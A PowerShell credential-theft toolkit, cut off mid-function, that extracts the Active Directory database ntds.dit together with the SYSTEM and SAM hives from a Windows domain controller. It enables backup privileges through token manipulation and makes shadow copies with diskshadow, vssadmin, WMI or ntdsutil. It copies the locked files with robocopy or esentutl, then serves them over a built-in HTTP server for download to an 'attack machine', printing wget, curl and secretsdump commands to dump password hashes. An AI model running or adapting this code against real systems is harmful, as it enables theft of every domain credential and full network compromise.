<#
.SYNOPSIS
    NTDS.dit Extraction Toolkit - Zero Hardcoded Data
.DESCRIPTION
    Comprehensive toolkit for extracting NTDS.dit with multiple methods.
    Dynamically detects environment, tools, and provides guidance when tools are missing.
.NOTES
    Author: Penetration Testing Toolkit
    Requires: SeBackupPrivilege or equivalent permissions
#>

param(
    [string]$OutputPath = $null,
    [switch]$ExtractOnly,
    [switch]$DumpHashes,
    [switch]$ServeFiles,
    [string]$ServeIP = $null,
    [int]$ServePort = 8000,
    [switch]$Help
)

# ============================================================================
# CONFIGURATION & GLOBALS
# ============================================================================
$Script:Results = @{
    ShadowDrive = $null
    NTDSPath = $null
    SystemPath = $null
    SAMPath = $null
    Method = $null
}

$Script:Colors = @{
    Success = "Green"
    Error = "Red"
    Warning = "Yellow"
    Info = "Cyan"
    Header = "Magenta"
}

# ============================================================================
# PRIVILEGE ENABLEMENT (Critical for Backup Operators)
# ============================================================================
function Enable-SeBackupPrivilege {
    Write-Status "Attempting to enable SeBackupPrivilege..." "Info"
    
    # Method 1: Try using SeBackupPrivilege DLLs if available
    $seBackupDll = Get-ChildItem -Path @(".", "C:\Tools", $env:TEMP, $env:USERPROFILE) -Filter "SeBackupPrivilegeUtils.dll" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($seBackupDll) {
        try {
            $modulePath = Split-Path $seBackupDll.FullName
            Import-Module (Join-Path $modulePath "SeBackupPrivilegeUtils.dll") -ErrorAction Stop
            Import-Module (Join-Path $modulePath "SeBackupPrivilegeCmdLets.dll") -ErrorAction Stop
            Set-SeBackupPrivilege
            Write-Status "SeBackupPrivilege enabled via DLL!" "Success"
            return $true
        } catch {
            Write-Status "DLL method failed: $_" "Warning"
        }
    }
    
    # Method 2: Use inline C# to enable privilege
    try {
        $enablePrivCode = @'
using System;
using System.Runtime.InteropServices;

public class TokenPrivileges {
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID {
        public uint LowPart;
        public int HighPart;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID_AND_ATTRIBUTES {
        public LUID Luid;
        public uint Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES {
        public uint PrivilegeCount;
        public LUID_AND_ATTRIBUTES Privileges;
    }
    
    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
    public const uint TOKEN_QUERY = 0x0008;
    public const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    
    public static bool EnablePrivilege(string privilege) {
        IntPtr tokenHandle;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out tokenHandle))
            return false;
        
        LUID luid;
        if (!LookupPrivilegeValue(null, privilege, out luid)) {
            CloseHandle(tokenHandle);
            return false;
        }
        
        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();
        tp.PrivilegeCount = 1;
        tp.Privileges.Luid = luid;
        tp.Privileges.Attributes = SE_PRIVILEGE_ENABLED;
        
        bool result = AdjustTokenPrivileges(tokenHandle, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        CloseHandle(tokenHandle);
        return result;
    }
}
'@
        
        Add-Type -TypeDefinition $enablePrivCode -ErrorAction Stop
        
        $result1 = [TokenPrivileges]::EnablePrivilege("SeBackupPrivilege")
        $result2 = [TokenPrivileges]::EnablePrivilege("SeRestorePrivilege")
        
        if ($result1) {
            Write-Status "SeBackupPrivilege enabled via API!" "Success"
        }
        if ($result2) {
            Write-Status "SeRestorePrivilege enabled via API!" "Success"
        }
        
        # Verify
        $privCheck = whoami /priv 2>$null
        if ($privCheck -match "SeBackupPrivilege.*Enabled") {
            Write-Status "Privilege verification: ENABLED" "Success"
            return $true
        } else {
            Write-Status "Privilege enabled but verification shows disabled (may still work)" "Warning"
            return $true
        }
        
    } catch {
        Write-Status "API method failed: $_" "Warning"
    }
    
    # Method 3: PowerShell workaround - spawn new process
    Write-Status "Could not enable privilege directly" "Warning"
    Write-Host @"

[MANUAL PRIVILEGE ENABLEMENT REQUIRED]
======================================
Your user has SeBackupPrivilege but it's not ENABLED.

Option 1 - Download and use SeBackupPrivilege DLLs:
    Download from: https://github.com/giuliano108/SeBackupPrivilege
    Import-Module .\SeBackupPrivilegeUtils.dll
    Import-Module .\SeBackupPrivilegeCmdLets.dll
    Set-SeBackupPrivilege
    # Then re-run this script

Option 2 - Use PSExec to spawn with privileges:
    psexec -i -s powershell.exe
    # Then re-run this script

Option 3 - Transfer files and extract on attack machine:
    The files have been extracted - use the HTTP server to download them
    Then run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL

"@ -ForegroundColor $Script:Colors.Warning
    
    return $false
}

# ============================================================================
# HTTP FILE SERVER (For Easy Downloads)
# ============================================================================
function Start-FileServer {
    param(
        [string]$Path,
        [string]$IP = $null,
        [int]$Port = 8000
    )
    
    # Auto-detect IP if not provided
    if (-not $IP) {
        $IP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
            $_.IPAddress -notmatch "^(127\.|169\.254\.)" -and $_.PrefixOrigin -ne "WellKnown"
        } | Select-Object -First 1).IPAddress
        
        if (-not $IP) {
            $IP = Read-Host "Enter YOUR IP address"
        }
    }
    
    # Kill any existing process on the port
    try {
        $existingConn = Get-NetTCPConnection -LocalPort $Port -ErrorAction SilentlyContinue
        if ($existingConn) {
            Get-Process -Id $existingConn.OwningProcess -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        }
    } catch {}
    
    Write-Section "HTTP FILE SERVER"
    Write-Host ""
    Write-Host "  [*] Sharing: $Path" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  ======= DOWNLOAD COMMANDS =======" -ForegroundColor Magenta
    Write-Host "  Browser:     http://${IP}:${Port}/" -ForegroundColor Green
    Write-Host ""
    Write-Host "  # Linux/Kali:" -ForegroundColor Yellow
    Write-Host "  wget http://${IP}:${Port}/ntds.dit" -ForegroundColor White
    Write-Host "  wget http://${IP}:${Port}/SYSTEM" -ForegroundColor White
    Write-Host "  wget http://${IP}:${Port}/SAM" -ForegroundColor White
    Write-Host ""
    Write-Host "  # Or with curl:" -ForegroundColor Yellow
    Write-Host "  curl http://${IP}:${Port}/ntds.dit -o ntds.dit" -ForegroundColor White
    Write-Host "  curl http://${IP}:${Port}/SYSTEM -o SYSTEM" -ForegroundColor White
    Write-Host ""
    Write-Host "  # One-liner (download all):" -ForegroundColor Yellow
    Write-Host "  for f in ntds.dit SYSTEM SAM; do wget http://${IP}:${Port}/`$f; done" -ForegroundColor White
    Write-Host ""
    Write-Host "  # Then extract hashes:" -ForegroundColor Yellow
    Write-Host "  secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL" -ForegroundColor White
    Write-Host "  =================================" -ForegroundColor Magenta
    Write-Host ""
    Write-Host "  [+] Available Files:" -ForegroundColor Cyan
    Get-ChildItem $Path -File | ForEach-Object {
        $size = "{0:N2} MB" -f ($_.Length / 1MB)
        Write-Host "      - $($_.Name) ($size)" -ForegroundColor White
    }
    Write-Host ""
    Write-Host "  [+] HTTP Server starting on port $Port..." -ForegroundColor Green
    Write-Host "  [!] Press Ctrl+C to stop the server" -ForegroundColor Yellow
    Write-Host ""
    
    try {
        $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, [int]$Port)
        $listener.Start()
        
        while ($true) {
            try {
                $client = $listener.AcceptTcpClient()
                $stream = $client.GetStream()
                $buffer = New-Object byte[] 4096
                $bytesRead = $stream.Read($buffer, 0, 4096)
                $request = [Text.Encoding]::ASCII.GetString($buffer, 0, $bytesRead)
                
                $uri = ""
                if ($request -match "GET /([^ ]*) ") {
                    $uri = [uri]::UnescapeDataString($matches[1])
                }
                
                Write-Host "  [>] GET /$uri" -ForegroundColor Gray
                
                if (-not $uri -or $uri -eq "/" -or $uri -eq "") {
                    # Directory listing
                    $html = "<html><head><title>NTDS Extract</title></head>"
                    $html += "<body style='background:#111;color:#0f0;font-family:monospace;padding:20px'>"
                    $html += "<h2>NTDS.dit Extraction - File Server</h2>"
                    $html += "<h3>Directory: $Path</h3><hr>"
                    Get-ChildItem $Path -File | ForEach-Object {
                        $size = "{0:N2} MB" -f ($_.Length / 1MB)
                        $html += "<a style='color:#0ff;font-size:18px' href='/$($_.Name)'>$($_.Name)</a> <span style='color:#888'>($size)</span><br><br>"
                    }
                    $html += "<hr><p style='color:#888'>Right-click and 'Save As' or use wget/curl</p>"
                    $html += "</body></html>"
                    
                    $body = [Text.Encoding]::UTF8.GetBytes($html)
                    $header = "HTTP/1.1 200 OK`r`nContent-Type: text/html`r`nContent-Length: $($body.Length)`r`n`r`n"
                    $stream.Write([Text.Encoding]::ASCII.GetBytes($header), 0, $header.Length)
                    $stream.Write($body, 0, $body.Length)
                } else {
                    $filePath = Join-Path $Path $uri
                    if (Test-Path $filePath -PathType Leaf) {
                        $bytes = [IO.File]::ReadAllBytes($filePath)
                        $header = "HTTP/1.1 200 OK`r`nContent-Type: application/octet-stream`r`nContent-Disposition: attachment; filename=`"$uri`"`r`nContent-Length: $($bytes.Length)`r`n`r`n"
                        $stream.Write([Text.Encoding]::ASCII.GetBytes($header), 0, $header.Length)
                        $stream.Write($bytes, 0, $bytes.Length)
                        Write-Host "  [+] Sent: $uri ($($bytes.Length) bytes)" -ForegroundColor Green
                    } else {
                        $header = "HTTP/1.1 404 Not Found`r`nContent-Length: 9`r`n`r`nNot Found"
                        $stream.Write([Text.Encoding]::ASCII.GetBytes($header), 0, $header.Length)
                        Write-Host "  [-] 404: $uri" -ForegroundColor Red
                    }
                }
                
                $client.Close()
            } catch {
                Write-Host "  [!] Connection error: $_" -ForegroundColor Yellow
            }
        }
    } catch {
        Write-Host "  [-] Server error: $_" -ForegroundColor Red
    } finally {
        if ($listener) {
            $listener.Stop()
        }
    }
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================
function Write-Banner {
    $banner = @"

 ███╗   ██╗████████╗██████╗ ███████╗    ███████╗██╗  ██╗████████╗██████╗  █████╗  ██████╗████████╗ ██████╗ ██████╗ 
 ████╗  ██║╚══██╔══╝██╔══██╗██╔════╝    ██╔════╝╚██╗██╔╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗
 ██╔██╗ ██║   ██║   ██║  ██║███████╗    █████╗   ╚███╔╝    ██║   ██████╔╝███████║██║        ██║   ██║   ██║██████╔╝
 ██║╚██╗██║   ██║   ██║  ██║╚════██║    ██╔══╝   ██╔██╗    ██║   ██╔══██╗██╔══██║██║        ██║   ██║   ██║██╔══██╗
 ██║ ╚████║   ██║   ██████╔╝███████║    ███████╗██╔╝ ██╗   ██║   ██║  ██║██║  ██║╚██████╗   ██║   ╚██████╔╝██║  ██║
 ╚═╝  ╚═══╝   ╚═╝   ╚═════╝ ╚══════╝    ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                    [ Zero Hardcoded Data - All Alternatives ]
"@
    Write-Host $banner -ForegroundColor $Script:Colors.Header
}

function Write-Status {
    param([string]$Message, [string]$Type = "Info")
    $prefix = switch ($Type) {
        "Success" { "[+]" }
        "Error"   { "[-]" }
        "Warning" { "[!]" }
        "Info"    { "[*]" }
        default   { "[*]" }
    }
    Write-Host "$prefix $Message" -ForegroundColor $Script:Colors[$Type]
}

function Write-Section {
    param([string]$Title)
    Write-Host "`n$('='*70)" -ForegroundColor $Script:Colors.Header
    Write-Host "  $Title" -ForegroundColor $Script:Colors.Header
    Write-Host "$('='*70)" -ForegroundColor $Script:Colors.Header
}

function Get-DynamicOutputPath {
    if ($OutputPath) { return $OutputPath }
    
    # Find writable directories dynamically
    $candidates = @(
        "$env:TEMP",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Desktop",
        "C:\Windows\Temp",
        "C:\Tools",
        "C:\Users\Public",
        (Get-Location).Path
    )
    
    foreach ($path in $candidates) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            try {
                $testFile = Join-Path $path "test_write_$(Get-Random).tmp"
                [IO.File]::WriteAllText($testFile, "test")
                Remove-Item $testFile -Force -ErrorAction SilentlyContinue
                $outputDir = Join-Path $path "NTDS_Extract_$(Get-Date -Format 'yyyyMMdd_HHmmss')"
                New-Item -ItemType Directory -Path $outputDir -Force | Out-Null
                Write-Status "Output directory: $outputDir" "Success"
                return $outputDir
            } catch { continue }
        }
    }
    throw "No writable directory found!"
}

function Find-AvailableDriveLetter {
    $usedLetters = (Get-PSDrive -PSProvider FileSystem).Name
    $available = [char[]](69..90) | Where-Object { [string]$_ -notin $usedLetters } # E-Z
    if ($available.Count -eq 0) { throw "No available drive letters!" }
    return [string]$available[0]
}

# ============================================================================
# ENVIRONMENT DETECTION
# ============================================================================
function Test-Environment {
    Write-Section "ENVIRONMENT DETECTION"
    
    $checks = @{
        IsDomainController = $false
        HasSeBackupPrivilege = $false
        HasSeRestorePrivilege = $false
        IsAdmin = $false
        NTDSExists = $false
        DomainInfo = $null
        CurrentUser = $null
        Groups = @()
    }
    
    # Current user info
    $checks.CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Write-Status "Current User: $($checks.CurrentUser)" "Info"
    
    # Admin check
    $checks.IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    Write-Status "Running as Admin: $($checks.IsAdmin)" $(if($checks.IsAdmin){"Success"}else{"Warning"})
    
    # Domain Controller check
    try {
        $dcCheck = Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop
        $checks.IsDomainController = $dcCheck.DomainRole -ge 4
        Write-Status "Is Domain Controller: $($checks.IsDomainController)" $(if($checks.IsDomainController){"Success"}else{"Warning"})
        
        if ($dcCheck.Domain) {
            $checks.DomainInfo = $dcCheck.Domain
            Write-Status "Domain: $($checks.DomainInfo)" "Info"
        }
    } catch {
        Write-Status "Could not determine DC status: $_" "Warning"
    }
    
    # NTDS.dit existence
    $ntdsPaths = @(
        "$env:SystemRoot\NTDS\ntds.dit",
        "C:\Windows\NTDS\ntds.dit"
    )
    foreach ($path in $ntdsPaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            $checks.NTDSExists = $true
            Write-Status "NTDS.dit found: $path" "Success"
            break
        }
    }
    if (-not $checks.NTDSExists) {
        Write-Status "NTDS.dit not found in standard locations" "Warning"
    }
    
    # Privilege checks
    $privs = whoami /priv 2>$null
    if ($privs -match "SeBackupPrivilege.*Enabled") {
        $checks.HasSeBackupPrivilege = $true
        Write-Status "SeBackupPrivilege: ENABLED" "Success"
    } else {
        Write-Status "SeBackupPrivilege: Not enabled" "Warning"
    }
    
    if ($privs -match "SeRestorePrivilege.*Enabled") {
        $checks.HasSeRestorePrivilege = $true
        Write-Status "SeRestorePrivilege: ENABLED" "Success"
    }
    
    # Group membership
    try {
        $groups = whoami /groups 2>$null
        $relevantGroups = @("Backup Operators", "Domain Admins", "Administrators", "Server Operators")
        foreach ($grp in $relevantGroups) {
            if ($groups -match $grp) {
                $checks.Groups += $grp
                Write-Status "Member of: $grp" "Success"
            }
        }
    } catch {}
    
    return $checks
}

# ============================================================================
# TOOL DETECTION
# ============================================================================
function Test-Tools {
    Write-Section "TOOL AVAILABILITY"
    
    $tools = @{
        Diskshadow = @{ Available = $false; Path = $null; Guide = $null }
        Robocopy = @{ Available = $false; Path = $null; Guide = $null }
        VSSAdmin = @{ Available = $false; Path = $null; Guide = $null }
        WMI = @{ Available = $false; Path = $null; Guide = $null }
        DSInternals = @{ Available = $false; Path = $null; Guide = $null }
        SecretsDump = @{ Available = $false; Path = $null; Guide = $null }
        SeBackupPrivilege = @{ Available = $false; Path = $null; Guide = $null }
        Ntdsutil = @{ Available = $false; Path = $null; Guide = $null }
        Esentutl = @{ Available = $false; Path = $null; Guide = $null }
    }
    
    # Diskshadow
    $diskshadowPaths = @(
        "$env:SystemRoot\System32\diskshadow.exe",
        "C:\Windows\System32\diskshadow.exe"
    )
    foreach ($path in $diskshadowPaths) {
        if (Test-Path $path) {
            $tools.Diskshadow.Available = $true
            $tools.Diskshadow.Path = $path
            Write-Status "diskshadow.exe: $path" "Success"
            break
        }
    }
    if (-not $tools.Diskshadow.Available) {
        Write-Status "diskshadow.exe: NOT FOUND" "Warning"
        $tools.Diskshadow.Guide = @"

[DISKSHADOW NOT FOUND - MANUAL GUIDE]
=====================================
Diskshadow is a Windows built-in tool (Server editions).
If not available:
1. You may be on a Workstation OS (not Server)
2. Use alternative methods: vssadmin, wmic, or ntdsutil
3. Transfer diskshadow.exe from another Server system (same arch)
"@
    }
    
    # Robocopy
    $robocopyPaths = @(
        "$env:SystemRoot\System32\robocopy.exe",
        "C:\Windows\System32\robocopy.exe"
    )
    foreach ($path in $robocopyPaths) {
        if (Test-Path $path) {
            $tools.Robocopy.Available = $true
            $tools.Robocopy.Path = $path
            Write-Status "robocopy.exe: $path" "Success"
            break
        }
    }
    
    # VSSAdmin
    $vssadminPaths = @(
        "$env:SystemRoot\System32\vssadmin.exe",
        "C:\Windows\System32\vssadmin.exe"
    )
    foreach ($path in $vssadminPaths) {
        if (Test-Path $path) {
            $tools.VSSAdmin.Available = $true
            $tools.VSSAdmin.Path = $path
            Write-Status "vssadmin.exe: $path" "Success"
            break
        }
    }
    
    # Ntdsutil
    $ntdsutilPaths = @(
        "$env:SystemRoot\System32\ntdsutil.exe",
        "C:\Windows\System32\ntdsutil.exe"
    )
    foreach ($path in $ntdsutilPaths) {
        if (Test-Path $path) {
            $tools.Ntdsutil.Available = $true
            $tools.Ntdsutil.Path = $path
            Write-Status "ntdsutil.exe: $path" "Success"
            break
        }
    }
    
    # Esentutl
    $esentutlPaths = @(
        "$env:SystemRoot\System32\esentutl.exe",
        "C:\Windows\System32\esentutl.exe"
    )
    foreach ($path in $esentutlPaths) {
        if (Test-Path $path) {
            $tools.Esentutl.Available = $true
            $tools.Esentutl.Path = $path
            Write-Status "esentutl.exe: $path" "Success"
            break
        }
    }
    
    # WMI/WMIC
    try {
        $null = Get-WmiObject -Class Win32_ShadowCopy -ErrorAction Stop
        $tools.WMI.Available = $true
        Write-Status "WMI ShadowCopy: Available" "Success"
    } catch {
        Write-Status "WMI ShadowCopy: Not accessible" "Warning"
    }
    
    # DSInternals Module
    $dsInternalsPaths = @()
    $modulePaths = $env:PSModulePath -split ';'
    foreach ($modPath in $modulePaths) {
        $dsInternalsPaths += Join-Path $modPath "DSInternals\DSInternals.psd1"
    }
    # Also search current directory and common locations
    $dsInternalsPaths += @(
        ".\DSInternals.psd1",
        ".\DSInternals\DSInternals.psd1",
        "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\DSInternals\DSInternals.psd1",
        "C:\Tools\DSInternals\DSInternals.psd1"
    )
    
    foreach ($path in $dsInternalsPaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            $tools.DSInternals.Available = $true
            $tools.DSInternals.Path = $path
            Write-Status "DSInternals: $path" "Success"
            break
        }
    }
    if (-not $tools.DSInternals.Available) {
        # Try to find it anywhere
        $found = Get-ChildItem -Path C:\ -Filter "DSInternals.psd1" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
        if ($found) {
            $tools.DSInternals.Available = $true
            $tools.DSInternals.Path = $found.FullName
            Write-Status "DSInternals: $($found.FullName)" "Success"
        } else {
            Write-Status "DSInternals: NOT FOUND" "Warning"
            $tools.DSInternals.Guide = @"

[DSINTERNALS NOT FOUND - INSTALLATION GUIDE]
============================================
Option 1 - PowerShell Gallery (requires internet):
    Install-Module -Name DSInternals -Force

Option 2 - Manual Download:
    1. Download from: https://github.com/MichaelGrafnetter/DSInternals/releases
    2. Extract to: C:\Tools\DSInternals\ or current directory
    3. Import: Import-Module .\DSInternals.psd1

Option 3 - Offline Transfer:
    1. On machine with internet: Save-Module -Name DSInternals -Path C:\Temp
    2. Transfer the DSInternals folder to target
    3. Import: Import-Module .\DSInternals\DSInternals.psd1
"@
        }
    }
    
    # SeBackupPrivilege Module/DLL
    $seBackupPaths = @(
        ".\SeBackupPrivilegeUtils.dll",
        ".\SeBackupPrivilegeCmdLets.dll",
        "$env:USERPROFILE\Documents\WindowsPowerShell\Modules\SeBackupPrivilege\SeBackupPrivilegeUtils.dll",
        "C:\Tools\SeBackupPrivilege\SeBackupPrivilegeUtils.dll"
    )
    foreach ($path in $seBackupPaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            $tools.SeBackupPrivilege.Available = $true
            $tools.SeBackupPrivilege.Path = (Split-Path $path)
            Write-Status "SeBackupPrivilege DLLs: $(Split-Path $path)" "Success"
            break
        }
    }
    if (-not $tools.SeBackupPrivilege.Available) {
        Write-Status "SeBackupPrivilege DLLs: NOT FOUND" "Warning"
        $tools.SeBackupPrivilege.Guide = @"

[SEBACKUPPRIVILEGE DLLS NOT FOUND - GUIDE]
==========================================
These DLLs enable Copy-FileSeBackupPrivilege cmdlet.

Download from:
    https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug

Required files:
    - SeBackupPrivilegeUtils.dll
    - SeBackupPrivilegeCmdLets.dll

Import:
    Import-Module .\SeBackupPrivilegeUtils.dll
    Import-Module .\SeBackupPrivilegeCmdLets.dll

Alternative: Use robocopy /B instead (built-in)
"@
    }
    
    # SecretsDump (Python/Impacket)
    $secretsDumpPaths = @(
        "secretsdump.py",
        ".\secretsdump.py",
        "C:\Tools\impacket\examples\secretsdump.py",
        "$env:USERPROFILE\impacket\examples\secretsdump.py"
    )
    # Also check if it's in PATH
    try {
        $inPath = Get-Command secretsdump.py -ErrorAction SilentlyContinue
        if ($inPath) {
            $tools.SecretsDump.Available = $true
            $tools.SecretsDump.Path = $inPath.Source
        }
    } catch {}
    
    if (-not $tools.SecretsDump.Available) {
        foreach ($path in $secretsDumpPaths) {
            if (Test-Path $path -ErrorAction SilentlyContinue) {
                $tools.SecretsDump.Available = $true
                $tools.SecretsDump.Path = $path
                break
            }
        }
    }
    
    if ($tools.SecretsDump.Available) {
        Write-Status "secretsdump.py: $($tools.SecretsDump.Path)" "Success"
    } else {
        Write-Status "secretsdump.py: NOT FOUND (extraction will use DSInternals or manual)" "Warning"
        $tools.SecretsDump.Guide = @"

[SECRETSDUMP NOT FOUND - GUIDE]
===============================
SecretsDump is part of Impacket (Python).

Option 1 - pip install:
    pip install impacket
    # Then use: secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL

Option 2 - Git clone:
    git clone https://github.com/SecureAuthCorp/impacket
    cd impacket && pip install .

Option 3 - Standalone binary (Windows):
    Download impacket-windows binaries from GitHub releases

Option 4 - Use on Kali/Attack machine:
    Transfer ntds.dit, SYSTEM, and SAM files to your attack machine
    Run: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
"@
    }
    
    return $tools
}

# ============================================================================
# SHADOW COPY METHODS
# ============================================================================
function New-ShadowCopy-Diskshadow {
    param([string]$DriveLetter)
    
    Write-Status "Creating shadow copy using DISKSHADOW..." "Info"
    
    $scriptContent = @"
set verbose on
set metadata $env:TEMP\meta_$(Get-Random).cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% ${DriveLetter}:
end backup
exit
"@
    
    $scriptPath = Join-Path $env:TEMP "diskshadow_$(Get-Random).txt"
    $scriptContent | Out-File -FilePath $scriptPath -Encoding ASCII
    
    try {
        $process = Start-Process -FilePath "diskshadow.exe" -ArgumentList "/s `"$scriptPath`"" -Wait -PassThru -NoNewWindow
        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
        
        if (Test-Path "${DriveLetter}:\") {
            Write-Status "Shadow copy exposed at ${DriveLetter}:\" "Success"
            return "${DriveLetter}:"
        } else {
            throw "Shadow copy not exposed"
        }
    } catch {
        Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
        throw $_
    }
}

function New-ShadowCopy-VSSAdmin {
    Write-Status "Creating shadow copy using VSSADMIN..." "Info"
    
    $output = vssadmin create shadow /for=C: 2>&1
    
    if ($output -match "Shadow Copy ID: ({[^}]+})") {
        $shadowId = $matches[1]
        Write-Status "Shadow copy created: $shadowId" "Success"
    }
    
    if ($output -match "Shadow Copy Volume Name: (\\\\[^\s]+)") {
        $shadowPath = $matches[1]
        Write-Status "Shadow copy path: $shadowPath" "Success"
        return $shadowPath
    }
    
    # If we couldn't parse, try to get the latest shadow copy
    $shadows = vssadmin list shadows /for=C: 2>&1
    if ($shadows -match "Shadow Copy Volume Name: (\\\\[^\s]+)") {
        $allMatches = [regex]::Matches($shadows, "Shadow Copy Volume Name: (\\\\[^\s]+)")
        $shadowPath = $allMatches[-1].Groups[1].Value
        Write-Status "Using existing shadow copy: $shadowPath" "Success"
        return $shadowPath
    }
    
    throw "Failed to create or find shadow copy"
}

function New-ShadowCopy-WMI {
    Write-Status "Creating shadow copy using WMI..." "Info"
    
    $shadowCopy = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
    
    if ($shadowCopy.ReturnValue -eq 0) {
        $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object { $_.ID -eq $shadowCopy.ShadowID }
        Write-Status "Shadow copy created: $($shadow.DeviceObject)" "Success"
        return $shadow.DeviceObject
    }
    
    # Try to get existing shadow copy
    $existingShadow = Get-WmiObject Win32_ShadowCopy | Select-Object -Last 1
    if ($existingShadow) {
        Write-Status "Using existing shadow copy: $($existingShadow.DeviceObject)" "Success"
        return $existingShadow.DeviceObject
    }
    
    throw "WMI shadow copy creation failed"
}

function New-ShadowCopy-Ntdsutil {
    param([string]$OutputDir)
    
    Write-Status "Using NTDSUTIL for IFM snapshot..." "Info"
    
    $ifmPath = Join-Path $OutputDir "IFM"
    
    $commands = @"
activate instance ntds
ifm
create full "$ifmPath"
quit
quit
"@
    
    $cmdPath = Join-Path $env:TEMP "ntdsutil_$(Get-Random).txt"
    $commands | Out-File -FilePath $cmdPath -Encoding ASCII
    
    try {
        $process = Start-Process -FilePath "ntdsutil.exe" -ArgumentList "`"$cmdPath`"" -Wait -PassThru -NoNewWindow -RedirectStandardInput $cmdPath
        
        # Check if IFM was created
        $ntdsIFM = Join-Path $ifmPath "Active Directory\ntds.dit"
        $regIFM = Join-Path $ifmPath "registry\SYSTEM"
        
        if ((Test-Path $ntdsIFM) -and (Test-Path $regIFM)) {
            Write-Status "IFM snapshot created at: $ifmPath" "Success"
            return @{
                Type = "IFM"
                NTDSPath = $ntdsIFM
                SystemPath = $regIFM
                SAMPath = Join-Path $ifmPath "registry\SAM"
            }
        }
    } catch {} finally {
        Remove-Item $cmdPath -Force -ErrorAction SilentlyContinue
    }
    
    throw "NTDSUTIL IFM creation failed"
}

# ============================================================================
# FILE COPY METHODS
# ============================================================================
function Copy-WithSeBackupPrivilege {
    param(
        [string]$Source,
        [string]$Destination,
        [string]$ModulePath
    )
    
    Write-Status "Copying using SeBackupPrivilege cmdlet..." "Info"
    
    Import-Module (Join-Path $ModulePath "SeBackupPrivilegeUtils.dll")
    Import-Module (Join-Path $ModulePath "SeBackupPrivilegeCmdLets.dll")
    
    Set-SeBackupPrivilege
    Copy-FileSeBackupPrivilege $Source $Destination
    
    if (Test-Path $Destination) {
        Write-Status "Copied: $Destination" "Success"
        return $true
    }
    return $false
}

function Copy-WithRobocopy {
    param(
        [string]$SourceDir,
        [string]$DestDir,
        [string]$FileName
    )
    
    Write-Status "Copying using ROBOCOPY /B (backup mode)..." "Info"
    
    if (-not (Test-Path $DestDir)) {
        New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
    }
    
    $result = robocopy /B $SourceDir $DestDir $FileName 2>&1
    
    $destFile = Join-Path $DestDir $FileName
    if (Test-Path $destFile) {
        Write-Status "Copied: $destFile" "Success"
        return $destFile
    }
    
    throw "Robocopy failed: $result"
}

function Copy-WithEsentutl {
    param(
        [string]$Source,
        [string]$Destination
    )
    
    Write-Status "Copying using ESENTUTL..." "Info"
    
    # esentutl can copy locked files
    $result = esentutl.exe /y $Source /d $Destination /o 2>&1
    
    if (Test-Path $Destination) {
        Write-Status "Copied: $Destination" "Success"
        return $true
    }
    
    throw "Esentutl copy failed"
}

function Copy-FromShadow {
    param(
        [string]$ShadowPath,
        [string]$OutputDir,
        [hashtable]$Tools
    )
    
    Write-Status "Copying files from shadow copy..." "Info"
    
    # Determine the NTDS path in shadow
    $ntdsSource = $null
    $systemSource = $null
    
    # Handle different shadow path formats
    if ($ShadowPath -match "^[A-Z]:$") {
        # Exposed drive letter (from diskshadow)
        $ntdsSource = "$ShadowPath\Windows\NTDS\ntds.dit"
        $systemSource = "$ShadowPath\Windows\System32\config\SYSTEM"
        $samSource = "$ShadowPath\Windows\System32\config\SAM"
